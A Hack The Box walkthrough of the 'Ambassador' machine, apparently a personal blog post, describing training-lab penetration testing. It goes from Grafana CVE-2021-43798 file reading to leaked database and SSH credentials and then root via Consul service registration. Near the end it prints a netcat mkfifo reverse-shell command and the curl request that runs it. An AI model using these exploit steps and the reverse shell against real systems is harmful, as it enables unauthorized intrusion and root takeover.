---
title: "HTB - Ambassador"
categories: [box]
date: 2022-10-29
comments: true
image: /images/walkthroughs/hackthebox/ambassador/logo.png
favicon: /images/walkthroughs/hackthebox/ambassador/logo.png
description: HTB - Ambassador walkthrough
---

# Ambassador

<p align="center">
  <img src="/images/walkthroughs/hackthebox/ambassador/banner.png" width="70%"/>
</p>


## Summary

Ambassador is a medium difficulty machine where there is not much enumeration on the website exposed, just some information about a SSH account called developer. Checking port 3000 we find a vulnerable grafana with LFI that we can use to extract grafana SQLite DB. This DB contains MySQL credentials that we can use to enter MySQL. Enumerating MySQL we find a database called _whackywidget_ with the developer credentials for SSH.

Once inside, we find a git folder with key information deleted in previous commits. It hid a Consul key that we used to register a new service on Consul. That service was runing as root, therefore we called a shell script to stablish a reverse shell to our machine. Once the service is registered, we get the revshell as root and solved the machine.


## Enumeration

- nmap

```bash
nmap -sC -sC -p- 10.10.11.183
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-29 05:15 EDT
Nmap scan report for 10.10.11.183
Host is up (0.044s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)
|   256 80:a4:c5:2e:9a:b1:ec:da:27:64:39:a4:08:97:3b:ef (ECDSA)
|_  256 f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 (ED25519)
80/tcp   open  http
|_http-generator: Hugo 0.94.2
|_http-title: Ambassador Development Server
3000/tcp open  ppp
3306/tcp open  mysql
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 1499
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolNew, LongPassword, ODBCClient, IgnoreSigpipes, Speaks41ProtocolOld, SupportsTransactions, ConnectWithDatabase, Support41Auth, SwitchToSSLAfterHandshake, SupportsCompression, FoundRows, DontAllowDatabaseTableColumn, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, LongColumnFlag, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: %i\x1A\x0B\x0286C%N NPG<c?\x14Cx
|_  Auth Plugin Name: caching_sha2_password
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
```


- gobuster

```bash
gobuster dir -u "http://10.10.11.183" --wordlist=/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 10 
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.183
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/10/29 05:34:32 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/categories           (Status: 301) [Size: 317] [--> http://10.10.11.183/categories/]
/images               (Status: 301) [Size: 313] [--> http://10.10.11.183/images/]
/index.html           (Status: 200) [Size: 3654]
/posts                (Status: 301) [Size: 312] [--> http://10.10.11.183/posts/]
/server-status        (Status: 403) [Size: 277]
/sitemap.xml          (Status: 200) [Size: 645]
/tags                 (Status: 301) [Size: 311] [--> http://10.10.11.183/tags/]
```


We can see a website talking about some credentials for the _developer_ account, but there is not to much to enumerate. The Hugo component is up-to-date with no current vulns:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/ambassador/1_0_we.png" width="80%"/>
</p>

Also, the MySQL is not vulnerable, quick bruteforce for basic users and password didn't turn out well. Then I realized the port 3000 is identified by nmap as _ppp_. It catched my attention and since there is no much to keep going I check that out and turned out to be a **Grafana server version v8.2.0 (d7f71e9eae)**:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/ambassador/1_1_grafana.png" width="80%"/>
</p>

That version is vulnerable to [CVE-2021-43798](https://nvd.nist.gov/vuln/detail/CVE-2021-43798), a Local File Inclusion (LFI) issue that allow us to read arbitrary files from the server. There are [public exploits](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798) for it, so I tried it. I cloned the repository and installed the requirements:

```bash
git clone https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798.git
cd exploit-grafana-CVE-2021-43798
python3.9 -m pip install -r requirements.txt
echo "http://10.10.11.183:3000" > list.txt
python3.9 exploit.py
```

Now run the exploit and get the information.

<p align="center">
  <img src="/images/walkthroughs/hackthebox/ambassador/1_2_exploit.png" width="90%"/>
</p>


We cannot decrypt any of the passwords by the original method, so let's manually inspect the DB with the SQLite DB browser. We found a relevant user on the _user_ table, but it has an encripted password. We cannot decrypt it with Grafana key. But comming to the passwords that the scripts try to decrypt we found on the _data\_source_ table a cleartext password for MySQL _grafana_ database:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/ambassador/2_0_sqlite.png" width="80%"/>
</p>


**grafana:dontStandSoCloseToMe63221!**

Using MySQL cliente, we use those credentials and we are into the database:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/ambassador/3_0_db.png" width="70%"/>
</p>

Going for a quick enumeration we can see an interesting batabase called _whackywidget_. Checking it's tables we can see one called _users_. Within it we have a user called _developer_ with a base64 password. It could be the one mentioned on the website for the SSH:

```sql
MySQL [grafana]> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+

MySQL [grafana]> use whackywidget;

-- using whackywidget

MySQL [grafana]> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
```

Converting from Base64 we get a new set of credentials that we will try on the SSH:

**developer:anEnglishManInNewYork027468**

And we are in, let's grab the user flag:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/ambassador/4_0_in.png" width="70%"/>
</p>


# Privesc

We are not allowed to run sudo, so let's load linpeas while doing some other manual enumeration. 

Checking processes with pspy64 we can see a cleanup.sh that runs find with the wildcard. It can be exploited so I left it on the checking list.

<p align="center">
  <img src="/images/walkthroughs/hackthebox/ambassador/6_1_pspy.png" width="75%"/>
</p>

Also we have execution permissions on that _/etc/consul.d/config.d_ directory, so we could create files to try exploiting it. Some first tests didn't turned out well so I keep enumerating the machine.

<p align="center">
  <img src="/images/walkthroughs/hackthebox/ambassador/7_1_.png" width="95%"/>
</p>

Linpeas displayed some interesting files, including the following git related ones:

```bash
-rw-rw-r-- 1 developer developer 93 Sep  2 02:28 /home/developer/.gitconfig
drwxrwxr-x 8 root root 4096 Mar 14  2022 /opt/my-app/.git
```

The .gitconfig has the following content:

```
[user]
        name = Developer
        email = developer@ambassador.local
[safe]
        directory = /opt/my-app
```

Let's check that repo on _/opt/my-app_. First thing I check are the _git logs_:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/ambassador/5_0_gitlog.png" width="70%"/>
</p>

For retrieving the changes on the different commits, use the _-p_ flag. It usually contains interesing files or sensitive data that was deleted. 

<p align="center">
  <img src="/images/walkthroughs/hackthebox/ambassador/7_0_consul.png" width="90%"/>
</p>

We find an interesting key for the Service Mesh software Consul that it is running on port 8500:


**consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD**


With that key, we can try to register a new service on consul, calling a revshell or creating a new bash with high privs. I used the script from the [metasploit module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/consul_service_exec.rb) as reference to create a request to consul to register a new service. With that service, we will execute a shell script with a revshell to our machine. If the consul job is run as root, we will get the shell as root:

Service data:

```json
{"ID": "kash","Name": "kash","Address": "127.0.0.1","Port": 80,"check": {"Args": ["/bin/bash", "/tmp/test.sh"],"interval": "10s","Timeout": "100s"}}
```

Bash script and request to register the service:

```bash
echo "mkfifo /tmp/f; nc 10.10.14.2 5456 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f" > /tmp/test.sh

curl -H "X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5" -X PUT -d '{"ID": "kash","Name": "kash","Address": "127.0.0.1","Port": 80,"check": {"Args": ["/bin/bash", "/tmp/test.sh"],"interval": "10s","Timeout": "100s"}}' http://127.0.0.1:8500/v1/agent/service/register
```

Once we send the PUT request to register the service, we get the reverse root shell and the flag:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/ambassador/8_0_root.png" width="95%"/>
</p>

